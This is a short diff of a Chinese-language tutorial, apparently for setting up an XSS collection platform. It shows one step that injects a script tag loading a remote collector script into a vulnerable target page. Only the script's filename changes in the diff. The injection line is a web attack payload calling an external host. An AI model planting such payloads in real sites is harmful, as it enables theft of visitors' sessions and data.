@@ -79,7 +79,7 @@ if(! $_REQUEST['ip']){
 
 ## 第六步：插入目标
 
-在目标xss漏洞存在的地方插入`<script type="text/javascript" src="https://127.0.0.1/xss.php"></script>`
+在目标xss漏洞存在的地方插入`<script type="text/javascript" src="https://127.0.0.1/xss1.php"></script>`
 
 **姜太公钓鱼，愿者上钩**
 
